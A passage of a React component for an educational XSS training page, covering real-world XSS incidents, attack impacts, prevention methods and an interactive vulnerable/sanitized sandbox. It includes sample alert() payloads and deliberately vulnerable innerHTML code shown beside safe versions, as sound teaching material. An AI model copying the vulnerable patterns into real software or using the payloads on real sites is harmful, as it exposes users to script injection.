                    <li>Double encoding: <code className="bg-amber-100 dark:bg-amber-900/40 px-1 rounded">%253Cscript%253E</code></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        );

      case 'realworld':
        return (
          <div className="space-y-4">
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-4">Notable Real-World XSS Attacks</h3>
              <div className="space-y-4">
                {[
                  {
                    name: 'Samy Worm (MySpace, 2005)',
                    severity: 'Critical',
                    desc: 'Samy Kamkar created a self-propagating XSS worm that spread across MySpace. The worm added "Samy is my hero" to victim profiles and replicated to their friends. Within 20 hours, it infected over 1 million profiles, making it the fastest-spreading virus of all time. It bypassed MySpace\'s filters using CSS expression() and clever encoding.',
                    impact: 'Over 1 million user profiles modified. MySpace was forced to shut down temporarily.',
                  },
                  {
                    name: 'TweetDeck XSS (Twitter, 2014)',
                    severity: 'High',
                    desc: 'A stored XSS vulnerability in TweetDeck (a popular Twitter client) allowed a self-retweeting tweet. The payload used unicode characters to bypass filters. The tweet automatically retweeted itself from any TweetDeck user\'s account who viewed it.',
                    impact: 'Tens of thousands of involuntary retweets. TweetDeck service temporarily suspended.',
                  },
                  {
                    name: 'eBay XSS Vulnerability (2015-2016)',
                    severity: 'High',
                    desc: 'Researchers discovered that eBay product listings could contain active XSS payloads. Attackers could embed scripts in listing descriptions that would execute when buyers viewed the items, potentially stealing session cookies and conducting phishing.',
                    impact: 'Millions of users potentially exposed. eBay was criticized for slow patching response.',
                  },
                  {
                    name: 'British Airways (Magecart, 2018)',
                    severity: 'Critical',
                    desc: 'Attackers injected malicious JavaScript into British Airways\' payment page via supply chain compromise. The script skimmed credit card data from 380,000 transactions over two weeks, sending payment details to attacker-controlled servers.',
                    impact: '380,000 payment cards stolen. BA fined 183 million GBP under GDPR.',
                  },
                  {
                    name: 'Fortnite SSO XSS (2019)',
                    severity: 'High',
                    desc: 'Researchers at Check Point discovered an XSS vulnerability in Epic Games\' legacy Unreal Tournament domain. The flaw could be chained to steal Fortnite authentication tokens, giving attackers full access to player accounts without knowing passwords.',
                    impact: 'Potentially 200+ million Fortnite accounts at risk. Patched before exploitation.',
                  },
                ].map((c, i) => (
                  <div key={i} className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-xs font-bold text-gray-900 dark:text-gray-100">{c.name}</h4>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
                        c.severity === 'Critical' ? 'bg-red-100 dark:bg-red-900/40 text-red-600 dark:text-red-400'
                        : 'bg-orange-100 dark:bg-orange-900/40 text-orange-600 dark:text-orange-400'
                      }`}>{c.severity}</span>
                    </div>
                    <p className="text-[11px] text-gray-600 dark:text-gray-400 leading-relaxed mb-2">{c.desc}</p>
                    <div className="flex items-start gap-1.5">
                      <AlertTriangle className="w-3 h-3 text-red-500 mt-0.5 shrink-0" />
                      <p className="text-[11px] text-red-600 dark:text-red-400 font-medium">{c.impact}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        );

      case 'impact':
        return (
          <div className="space-y-4">
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-4">Impact of XSS Attacks</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                {[
                  {
                    title: 'Session Hijacking',
                    icon: <Unlock className="w-4 h-4" />,
                    color: 'red',
                    desc: 'Attackers steal session cookies (document.cookie) and use them to impersonate the victim. They can access the victim\'s account without needing credentials, perform actions on their behalf, and escalate privileges.',
                  },
                  {
                    title: 'Cookie Theft',
                    icon: <Database className="w-4 h-4" />,
                    color: 'orange',
                    desc: 'Session tokens, authentication cookies, and CSRF tokens can be exfiltrated to attacker-controlled servers. Unless cookies are marked HttpOnly, JavaScript can read and transmit them freely.',
                  },
                  {
                    title: 'Website Defacement',
                    icon: <Globe className="w-4 h-4" />,
                    color: 'purple',
                    desc: 'Attackers can rewrite the entire page content using innerHTML or document.write, displaying propaganda, misinformation, or fake content that damages the organization\'s reputation.',
                  },
                  {
                    title: 'Keylogging',
                    icon: <Terminal className="w-4 h-4" />,
                    color: 'yellow',
                    desc: 'Injected scripts can register event listeners for keypress, keydown, and keyup events, silently recording every keystroke including passwords, credit card numbers, and personal messages.',
                  },
                  {
                    title: 'Phishing / Credential Theft',
                    icon: <Users className="w-4 h-4" />,
                    color: 'blue',
                    desc: 'XSS can inject convincing fake login forms over legitimate pages. Since the domain in the address bar is correct, users have no reason to suspect the form is fake, making phishing virtually undetectable.',
                  },
                  {
                    title: 'Malware Distribution',
                    icon: <Bug className="w-4 h-4" />,
                    color: 'green',
                    desc: 'Scripts can redirect users to malware download pages, inject drive-by download exploits, or load cryptocurrency miners that consume user resources without consent.',
                  },
                ].map((item, i) => {
                  const colorMap: Record<string, string> = {
                    red: 'bg-red-50 dark:bg-red-950/20 border-red-200 dark:border-red-800/50 text-red-700 dark:text-red-400',
                    orange: 'bg-orange-50 dark:bg-orange-950/20 border-orange-200 dark:border-orange-800/50 text-orange-700 dark:text-orange-400',
                    purple: 'bg-purple-50 dark:bg-purple-950/20 border-purple-200 dark:border-purple-800/50 text-purple-700 dark:text-purple-400',
                    yellow: 'bg-yellow-50 dark:bg-yellow-950/20 border-yellow-200 dark:border-yellow-800/50 text-yellow-700 dark:text-yellow-400',
                    blue: 'bg-blue-50 dark:bg-blue-950/20 border-blue-200 dark:border-blue-800/50 text-blue-700 dark:text-blue-400',
                    green: 'bg-green-50 dark:bg-green-950/20 border-green-200 dark:border-green-800/50 text-green-700 dark:text-green-400',
                  };
                  const iconColorMap: Record<string, string> = {
                    red: 'bg-red-100 dark:bg-red-900/40 text-red-600 dark:text-red-400',
                    orange: 'bg-orange-100 dark:bg-orange-900/40 text-orange-600 dark:text-orange-400',
                    purple: 'bg-purple-100 dark:bg-purple-900/40 text-purple-600 dark:text-purple-400',
                    yellow: 'bg-yellow-100 dark:bg-yellow-900/40 text-yellow-600 dark:text-yellow-400',
                    blue: 'bg-blue-100 dark:bg-blue-900/40 text-blue-600 dark:text-blue-400',
                    green: 'bg-green-100 dark:bg-green-900/40 text-green-600 dark:text-green-400',
                  };
                  return (
                    <div key={i} className={`rounded-xl border p-4 ${colorMap[item.color]}`}>
                      <div className="flex items-center gap-2 mb-2">
                        <div className={`w-7 h-7 rounded-lg flex items-center justify-center ${iconColorMap[item.color]}`}>
                          {item.icon}
                        </div>
                        <h4 className="text-xs font-bold">{item.title}</h4>
                      </div>
                      <p className="text-[11px] leading-relaxed opacity-90">{item.desc}</p>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        );

      case 'prevention':
        return (
          <div className="space-y-4">
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-4">XSS Prevention Strategies</h3>
              <div className="space-y-4">
                {[
                  {
                    title: 'Output Encoding / Escaping',
                    icon: <Code className="w-4 h-4" />,
                    priority: 'Essential',
                    desc: 'The primary defense against XSS. Always encode user output based on the context where it appears. HTML entity encoding converts dangerous characters like <, >, &, ", and \' into their safe HTML entity equivalents. The encoding must be context-aware: HTML body, HTML attributes, JavaScript, CSS, and URLs each require different encoding rules.',
                    example: '< becomes &lt;  |  > becomes &gt;  |  " becomes &quot;  |  \' becomes &#x27;',
                  },
                  {
                    title: 'Content Security Policy (CSP)',
                    icon: <Shield className="w-4 h-4" />,
                    priority: 'Essential',
                    desc: 'CSP is an HTTP response header that tells the browser which sources of content are allowed to be loaded. A strict CSP can prevent inline script execution, restrict script sources to trusted domains, and block eval(). This is a critical defense-in-depth measure.',
                    example: "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'",
                  },
                  {
                    title: 'HttpOnly Cookie Flag',
                    icon: <Lock className="w-4 h-4" />,
                    priority: 'Important',
                    desc: 'Setting the HttpOnly flag on cookies prevents JavaScript from accessing them via document.cookie. This means that even if an XSS attack succeeds, it cannot steal session cookies. Combined with the Secure flag (HTTPS only) and SameSite attribute, this significantly limits cookie-based attacks.',
                    example: 'Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict',
                  },
                  {
                    title: 'Input Validation & Sanitization',
                    icon: <CheckCircle className="w-4 h-4" />,
                    priority: 'Important',
                    desc: 'Validate all input on the server side using allowlists (not blocklists). Reject or strip any input that does not match expected patterns. For rich text, use a well-tested sanitization library like DOMPurify that parses HTML and removes dangerous elements and attributes while preserving safe formatting.',
                    example: 'Allow only: [a-zA-Z0-9 @.,-] for name fields  |  Use DOMPurify for rich text',
                  },
                  {
                    title: 'Use Safe DOM APIs',
                    icon: <FileCode className="w-4 h-4" />,
                    priority: 'Important',
                    desc: 'Avoid innerHTML, document.write(), and outerHTML when inserting user-controlled data. Instead use textContent (which never parses HTML), createElement + appendChild, or template literals with proper escaping. Modern frameworks like React automatically escape JSX expressions, preventing most XSS by default.',
                    example: 'element.textContent = userInput;  // Safe: never parses HTML',
                  },
                  {
                    title: 'X-XSS-Protection & Security Headers',
                    icon: <Shield className="w-4 h-4" />,
                    priority: 'Supplementary',
                    desc: 'While deprecated in modern browsers (in favor of CSP), the X-XSS-Protection header enables built-in browser XSS filters. Additional headers like X-Content-Type-Options: nosniff prevent MIME-type sniffing attacks. These headers provide defense-in-depth layering.',
                    example: 'X-XSS-Protection: 1; mode=block  |  X-Content-Type-Options: nosniff',
                  },
                ].map((m, i) => (
                  <div key={i} className="bg-green-50 dark:bg-green-950/10 rounded-lg border border-green-200 dark:border-green-800/50 p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6 rounded-lg bg-green-100 dark:bg-green-900/40 flex items-center justify-center text-green-600 dark:text-green-400">
                          {m.icon}
                        </div>
                        <h4 className="text-xs font-bold text-green-800 dark:text-green-300">{m.title}</h4>
                      </div>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
                        m.priority === 'Essential' ? 'bg-green-200 dark:bg-green-800/60 text-green-800 dark:text-green-200'
                        : m.priority === 'Important' ? 'bg-blue-200 dark:bg-blue-800/60 text-blue-800 dark:text-blue-200'
                        : 'bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300'
                      }`}>{m.priority}</span>
                    </div>
                    <p className="text-[11px] text-green-700 dark:text-green-400 leading-relaxed mb-2">{m.desc}</p>
                    <div className="bg-gray-900 rounded-md px-3 py-2">
                      <code className="text-[10px] text-green-300 font-mono break-all">{m.example}</code>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        );

      case 'code':
        return (
          <div className="space-y-4">
            <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-5">
              <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-4">Vulnerable vs Safe Code Examples</h3>

              {[
                {
                  title: 'Rendering User Input in HTML',
                  vulnerable: `// VULNERABLE: Direct innerHTML assignment
function displaySearch(query) {
  document.getElementById('results').innerHTML =
    'Results for: ' + query;
  // If query = <script>alert('XSS')</script>
  // The script WILL execute!
}`,
                  safe: `// SAFE: Using textContent instead
function displaySearch(query) {
  const el = document.getElementById('results');
  el.textContent = 'Results for: ' + query;
  // textContent never parses HTML
  // <script> tags are displayed as plain text
}`,
                },
                {
                  title: 'Server-Side Template Rendering',
                  vulnerable: `<!-- VULNERABLE: Unescaped output in template -->
<div class="comment">
  <p>\${comment.body}</p>
</div>
<!-- If comment.body contains HTML/JS,
     it will be rendered and executed -->`,
                  safe: `<!-- SAFE: HTML-escaped output -->
<div class="comment">
  <p>\${escapeHtml(comment.body)}</p>
</div>

function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}`,
                },
                {
                  title: 'React JSX (Framework Protection)',
                  vulnerable: `// VULNERABLE: dangerouslySetInnerHTML
function Comment({ body }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: body }}
    />
  );
  // React explicitly warns via the name:
  // this bypasses ALL XSS protection
}`,
                  safe: `// SAFE: Normal JSX expression (auto-escaped)
function Comment({ body }) {
  return <div>{body}</div>;
  // React automatically escapes the content
  // <script> tags render as plain text
  // This is safe by default!
}`,
                },
                {
                  title: 'URL Parameter Handling',
                  vulnerable: `// VULNERABLE: Inserting URL params into DOM
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML =
  'Welcome, ' + name;
// URL: ?name=<img src=x onerror=alert('XSS')>
// Image tag executes the onerror handler!`,
                  safe: `// SAFE: Validate + use textContent
const params = new URLSearchParams(location.search);
const name = params.get('name');
// Validate: only allow alphanumeric + spaces
if (/^[a-zA-Z0-9 ]+$/.test(name)) {
  document.getElementById('greeting')
    .textContent = 'Welcome, ' + name;
} else {
  document.getElementById('greeting')
    .textContent = 'Welcome, Guest';
}`,
                },
                {
                  title: 'Express.js Cookie Security',
                  vulnerable: `// VULNERABLE: Cookies accessible to JS
app.use(session({
  secret: 'mysecret',
  cookie: {
    // No HttpOnly flag!
    // No Secure flag!
    // No SameSite attribute!
  }
}));
// document.cookie can read session tokens`,
                  safe: `// SAFE: Properly secured cookies
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,   // JS cannot access
    secure: true,     // HTTPS only
    sameSite: 'strict', // No cross-site
    maxAge: 3600000   // 1-hour expiry
  }
}));
// Even if XSS occurs, cookies are protected`,
                },
              ].map((ex, i) => (
                <div key={i} className="mb-5 last:mb-0">
                  <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300 mb-2">{ex.title}</h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    <div className="bg-red-950 rounded-lg p-3 border border-red-800/50">
                      <div className="flex items-center gap-1.5 mb-2">
                        <ShieldAlert className="w-3 h-3 text-red-400" />
                        <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Vulnerable</span>
                      </div>
                      <pre className="text-[11px] text-red-200 font-mono whitespace-pre-wrap leading-relaxed overflow-x-auto">{ex.vulnerable}</pre>
                    </div>
                    <div className="bg-green-950 rounded-lg p-3 border border-green-800/50">
                      <div className="flex items-center gap-1.5 mb-2">
                        <Shield className="w-3 h-3 text-green-400" />
                        <span className="text-[10px] font-bold text-green-400 uppercase tracking-wider">Safe</span>
                      </div>
                      <pre className="text-[11px] text-green-200 font-mono whitespace-pre-wrap leading-relaxed overflow-x-auto">{ex.safe}</pre>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  // ─── Sandbox Tab Render ─────────────────────────────────────────────────

  const currentPayloads = sandboxTab === 'reflected' ? REFLECTED_PAYLOADS : sandboxTab === 'stored' ? STORED_PAYLOADS : DOM_PAYLOADS;

  const renderSandboxContent = () => (
    <div className="space-y-3">
      {/* Quick Start */}
      <div className="flex items-start gap-2 px-3 py-2 bg-red-50 dark:bg-red-950/40 rounded-lg border border-red-200 dark:border-red-800 text-xs">
        <span className="font-bold text-red-700 dark:text-red-400 flex-shrink-0 mt-0.5">How to use:</span>
        <div className="flex flex-wrap gap-x-2 gap-y-1 text-gray-700 dark:text-gray-300 leading-relaxed">
          <span><span className="font-semibold text-red-700 dark:text-red-400">1.</span> Mode is set to <strong>Vulnerable</strong> — click one of the preset payload buttons (e.g. "Basic Alert") to auto-fill an attack</span>
          <span className="text-gray-400">·</span>
          <span><span className="font-semibold text-red-700 dark:text-red-400">2.</span> The preview below shows what happens when the browser runs that code on an unsafe website</span>
          <span className="text-gray-400">·</span>
          <span><span className="font-semibold text-red-700 dark:text-red-400">3.</span> Switch to <strong>Sanitized</strong> mode to see how the same input is made safe — the attack no longer works</span>
          <span className="text-gray-400">·</span>
          <span><span className="font-semibold text-red-700 dark:text-red-400">4.</span> Try all 3 tabs: <strong>Reflected</strong>, <strong>Stored</strong>, and <strong>DOM</strong> — each is a different way XSS attacks work</span>
        </div>
      </div>
      {/* Mode Toggle + Reset */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-1 bg-gray-100 dark:bg-gray-800 rounded-lg p-0.5">
          <button
            onClick={() => setMode('vulnerable')}
            className={`px-3 py-1.5 text-xs rounded-md font-medium transition-colors flex items-center gap-1.5 ${
              mode === 'vulnerable' ? 'bg-red-600 text-white shadow-sm' : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-200'
            }`}
          >
            <Unlock className="w-3 h-3" /> Vulnerable
          </button>
          <button
            onClick={() => setMode('sanitized')}
            className={`px-3 py-1.5 text-xs rounded-md font-medium transition-colors flex items-center gap-1.5 ${
              mode === 'sanitized' ? 'bg-green-600 text-white shadow-sm' : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-200'
            }`}
          >
            <Lock className="w-3 h-3" /> Sanitized
          </button>
        </div>
        <button onClick={resetSandbox} className="flex items-center gap-1 px-2.5 py-1.5 text-xs text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 bg-gray-100 dark:bg-gray-800 rounded-lg transition-colors">
          <RefreshCw className="w-3 h-3" /> Reset
        </button>
      </div>

      {/* XSS Sub-Type Tabs */}
      <div className="flex gap-1 bg-gray-100 dark:bg-gray-800 rounded-lg p-0.5">
        {([
          { key: 'reflected' as SandboxSubTab, label: 'Reflected XSS' },
          { key: 'stored' as SandboxSubTab, label: 'Stored XSS' },
          { key: 'dom' as SandboxSubTab, label: 'DOM-based XSS' },
        ]).map(tab => (
          <button
            key={tab.key}
            onClick={() => { setSandboxTab(tab.key); setInput(''); setSearchResult(''); setDomContent(''); }}
            className={`flex-1 px-3 py-1.5 text-xs rounded-md font-medium transition-colors ${
              sandboxTab === tab.key ? 'bg-purple-600 text-white shadow-sm' : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-200'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Context Description */}
      <div className={`rounded-lg border p-3 text-xs ${
        sandboxTab === 'reflected' ? 'bg-orange-50 dark:bg-orange-950/20 border-orange-200 dark:border-orange-800/50 text-orange-700 dark:text-orange-400'
        : sandboxTab === 'stored' ? 'bg-red-50 dark:bg-red-950/20 border-red-200 dark:border-red-800/50 text-red-700 dark:text-red-400'
        : 'bg-yellow-50 dark:bg-yellow-950/20 border-yellow-200 dark:border-yellow-800/50 text-yellow-700 dark:text-yellow-400'
      }`}>
        {sandboxTab === 'reflected' && 'Simulating a search page that reflects your query in the results. In vulnerable mode, HTML/JS in the query executes. In sanitized mode, special characters are escaped.'}
        {sandboxTab === 'stored' && 'Simulating a comment section where input is stored and displayed to all users. In vulnerable mode, malicious comments persist and affect every viewer.'}
        {sandboxTab === 'dom' && 'Simulating a page that reads user input and writes it to the DOM via JavaScript. In vulnerable mode, innerHTML is used. In sanitized mode, textContent is used.'}
      </div>

      {/* Mock Browser Application */}
      <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden">
        {/* Browser Chrome */}
        <div className="flex items-center gap-2 px-3 py-2 bg-gray-100 dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
          <div className="flex gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-red-400" />
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-400" />
            <div className="w-2.5 h-2.5 rounded-full bg-green-400" />
          </div>
          <div className="flex-1 bg-white dark:bg-gray-700 rounded px-2.5 py-1 text-[11px] font-mono text-gray-500 dark:text-gray-400 truncate">
            {sandboxTab === 'reflected' && `https://vulnerable-app.com/search?q=${encodeURIComponent(input || '...')}`}
            {sandboxTab === 'stored' && 'https://vulnerable-app.com/blog/post/42/comments'}
            {sandboxTab === 'dom' && `https://vulnerable-app.com/page#${encodeURIComponent(input || '...')}`}
          </div>
          <div className={`w-3 h-3 rounded-full ${isSafe ? 'bg-green-500' : 'bg-red-500'}`} title={isSafe ? 'Protected' : 'Vulnerable'} />
        </div>

        {/* Page Content */}
        <div className="p-4">
          <h3 className="text-sm font-bold text-gray-900 dark:text-gray-100 mb-1">
            {sandboxTab === 'reflected' ? 'Search' : sandboxTab === 'stored' ? 'Blog Post Comments' : 'Dynamic Content Page'}
          </h3>
          <p className="text-[11px] text-gray-500 dark:text-gray-500 mb-3">
            {sandboxTab === 'reflected' ? 'Enter a search query below.' : sandboxTab === 'stored' ? 'Join the conversation! Leave a comment.' : 'This page dynamically renders content from user input.'}
          </p>

          {/* Stored: Comment List */}
          {sandboxTab === 'stored' && (
            <div className="space-y-2 mb-3 max-h-48 overflow-y-auto pr-1">
              {storedComments.map(c => (
                <div key={c.id} className={`p-2.5 rounded-lg text-xs border ${
                  c.isXSS ? 'bg-red-50 dark:bg-red-950/20 border-red-300 dark:border-red-700' : 'bg-gray-50 dark:bg-gray-800 border-gray-200 dark:border-gray-700'
                }`}>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="font-semibold text-gray-700 dark:text-gray-300">{c.author}</span>
                    <span className="text-[10px] text-gray-400">{c.timestamp}</span>
                    {c.isXSS && <span className="text-[9px] font-bold text-red-500 bg-red-100 dark:bg-red-900/50 px-1.5 py-0.5 rounded-full">XSS PAYLOAD</span>}
                  </div>
                  <div className="text-gray-600 dark:text-gray-400 font-mono break-all">{c.text}</div>
                </div>
              ))}
            </div>
          )}

          {/* Reflected: Search Result Display */}
          {sandboxTab === 'reflected' && searchResult && (
            <div className={`mb-3 p-3 rounded-lg border text-xs ${
              detection.hasXSS && !isSafe
                ? 'bg-red-50 dark:bg-red-950/20 border-red-300 dark:border-red-800'
                : 'bg-gray-50 dark:bg-gray-800 border-gray-200 dark:border-gray-700'
            }`}>
              <span className="text-gray-500 dark:text-gray-500">Showing results for: </span>
              <span className={`font-mono break-all ${detection.hasXSS && !isSafe ? 'text-red-500 font-bold' : 'text-gray-700 dark:text-gray-300'}`}>
                {searchResult}
              </span>
            </div>
          )}

          {/* DOM: Content Display */}
          {sandboxTab === 'dom' && domContent && (
            <div className={`mb-3 p-3 rounded-lg border text-xs ${
              detection.hasXSS && !isSafe
                ? 'bg-red-50 dark:bg-red-950/20 border-red-300 dark:border-red-800'
                : 'bg-gray-50 dark:bg-gray-800 border-gray-200 dark:border-gray-700'
            }`}>
              <p className="text-[10px] text-gray-500 dark:text-gray-500 mb-1 font-mono">
                {isSafe ? 'element.textContent = userInput;' : 'element.innerHTML = userInput;'}
              </p>
              <div className={`font-mono break-all ${detection.hasXSS && !isSafe ? 'text-red-500 font-bold' : 'text-gray-700 dark:text-gray-300'}`}>
                {domContent}
              </div>
            </div>
          )}

          {/* Input Field */}
          <div className="flex gap-2">
            <input
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && handleSubmit()}
              placeholder={
                sandboxTab === 'reflected' ? 'Enter search query (try an XSS payload)...'
                : sandboxTab === 'stored' ? 'Write a comment (try injecting a script)...'
                : 'Enter content to render in DOM...'
              }
              className="flex-1 px-3 py-2 text-sm rounded-lg bg-gray-50 dark:bg-gray-800 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-gray-100 font-mono focus:outline-none focus:ring-2 focus:ring-purple-500/50 focus:border-purple-500"
              spellCheck={false}
            />
            <button
              onClick={handleSubmit}
              className="px-4 py-2 text-xs font-semibold bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-1.5 shrink-0"
            >
              <Play className="w-3 h-3" />
              {sandboxTab === 'reflected' ? 'Search' : sandboxTab === 'stored' ? 'Post' : 'Render'}
            </button>
          </div>
        </div>
      </div>

      {/* Detection & Sanitization Display */}
      {input && (
        <div className={`rounded-xl border p-3 ${
          detection.hasXSS
            ? isSafe
              ? 'bg-green-50 dark:bg-green-950/20 border-green-300 dark:border-green-800'
              : 'bg-red-50 dark:bg-red-950/20 border-red-300 dark:border-red-800'
            : 'bg-gray-50 dark:bg-gray-900 border-gray-200 dark:border-gray-700'
        }`}>
          <div className="flex items-center gap-2 mb-2">
            {detection.hasXSS ? (
              isSafe ? <CheckCircle className="w-4 h-4 text-green-500" /> : <AlertTriangle className="w-4 h-4 text-red-500" />
            ) : (
              <Shield className="w-4 h-4 text-gray-400" />
            )}
            <span className={`text-xs font-bold ${
              detection.hasXSS
                ? isSafe ? 'text-green-700 dark:text-green-400' : 'text-red-700 dark:text-red-400'
                : 'text-gray-600 dark:text-gray-400'
            }`}>
              {detection.hasXSS
                ? isSafe
                  ? 'XSS patterns detected and NEUTRALIZED -- attack blocked!'
                  : 'XSS patterns detected -- application is VULNERABLE!'
                : 'No known XSS patterns detected in current input.'
              }
            </span>
          </div>
          {detection.patterns.length > 0 && (
            <ul className="space-y-1 ml-6">
              {detection.patterns.map((p, i) => (
                <li key={i} className="text-[11px] text-gray-600 dark:text-gray-400 flex items-center gap-1.5">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${detection.hasXSS && !isSafe ? 'bg-red-500' : 'bg-green-500'}`} />
                  {p}
                </li>
              ))}
            </ul>
          )}
        </div>
      )}

      {/* Real-time Sanitization Comparison */}
      {input && detection.hasXSS && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <div className="bg-red-50 dark:bg-red-950/20 rounded-xl border border-red-200 dark:border-red-800/50 p-3">
            <div className="flex items-center justify-between mb-2">
              <h4 className="text-xs font-bold text-red-700 dark:text-red-400 flex items-center gap-1.5">
                <ShieldAlert className="w-3.5 h-3.5" /> Raw HTML (Vulnerable)
              </h4>
              <button onClick={() => copyToClipboard(input)} className="text-red-400 hover:text-red-300 transition-colors" title="Copy">
                <Copy className="w-3 h-3" />
              </button>
            </div>
            <div className="bg-white dark:bg-gray-900 rounded-lg p-2.5 text-[11px] font-mono text-red-800 dark:text-red-300 break-all border border-red-200 dark:border-red-800 max-h-24 overflow-auto">
              {input}
            </div>
            <p className="text-[10px] text-red-500 mt-1.5">Browser parses and executes HTML/JS tags.</p>
          </div>
          <div className="bg-green-50 dark:bg-green-950/20 rounded-xl border border-green-200 dark:border-green-800/50 p-3">
            <div className="flex items-center justify-between mb-2">
              <h4 className="text-xs font-bold text-green-700 dark:text-green-400 flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5" /> Sanitized Output (Safe)
              </h4>
              <button onClick={() => copyToClipboard(sanitizeHTML(input))} className="text-green-400 hover:text-green-300 transition-colors" title="Copy">
                <Copy className="w-3 h-3" />
              </button>
            </div>
            <div className="bg-white dark:bg-gray-900 rounded-lg p-2.5 text-[11px] font-mono text-green-800 dark:text-green-300 break-all border border-green-200 dark:border-green-800 max-h-24 overflow-auto">
              {sanitizeHTML(input)}
            </div>
            <p className="text-[10px] text-green-500 mt-1.5">HTML entities escaped. Displayed as plain text only.</p>
          </div>
        </div>
      )}

      {/* Raw HTML vs Rendered Toggle */}
      {input && (
        <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden">
          <div className="flex items-center justify-between px-3 py-2 bg-gray-50 dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
            <h4 className="text-xs font-bold text-gray-700 dark:text-gray-300">Preview Panel</h4>
            <button
              onClick={() => setShowRawHTML(!showRawHTML)}
              className="flex items-center gap-1.5 px-2.5 py-1 text-[11px] font-medium rounded-md bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
            >
              {showRawHTML ? <Eye className="w-3 h-3" /> : <EyeOff className="w-3 h-3" />}
              {showRawHTML ? 'Show Rendered' : 'Show Raw HTML'}
            </button>
          </div>
          <div className="p-3">
            {showRawHTML ? (
              <div className="bg-gray-900 rounded-lg p-3">
                <pre className="text-[11px] text-gray-300 font-mono whitespace-pre-wrap break-all leading-relaxed">
{`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <div class="app">
    <div class="content">
      <div class="user-input">
        ${isSafe ? sanitizeHTML(input) : input}
      </div>
    </div>
  </div>
</body>
</html>`}
                </pre>
              </div>
            ) : (
              <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-3 text-xs text-gray-700 dark:text-gray-300">
                <p className="text-[10px] text-gray-400 mb-2 font-mono">Rendered page output:</p>
                <div className="font-mono break-all">
                  {isSafe ? sanitizeHTML(input) : input}
                </div>
                {detection.hasXSS && !isSafe && (
                  <div className="mt-2 p-2 bg-red-100 dark:bg-red-900/30 rounded text-[10px] text-red-600 dark:text-red-400 border border-red-200 dark:border-red-800">
                    In a real browser, the injected script/element would execute here.
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* DOM Tree Visualization */}
      {input && (
        <div className="bg-gray-950 rounded-xl border border-gray-700 p-4">
          <div className="flex items-center justify-between mb-3">
            <h4 className="text-xs font-semibold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
              <Eye className="w-3.5 h-3.5" /> DOM Tree Visualization
            </h4>
            {detection.hasXSS && !isSafe && (
              <span className="text-[9px] font-bold text-red-400 bg-red-500/20 px-2 py-0.5 rounded-full animate-pulse">
                MALICIOUS NODES INJECTED
              </span>
            )}
          </div>
          {renderDOMTree(input, isSafe)}
        </div>
      )}

      {/* Pre-built Payloads */}
      <div className="bg-white dark:bg-gray-900 rounded-xl border border-gray-200 dark:border-gray-700 p-3">
        <h4 className="text-xs font-semibold text-gray-500 dark:text-gray-400 uppercase tracking-wider mb-3">
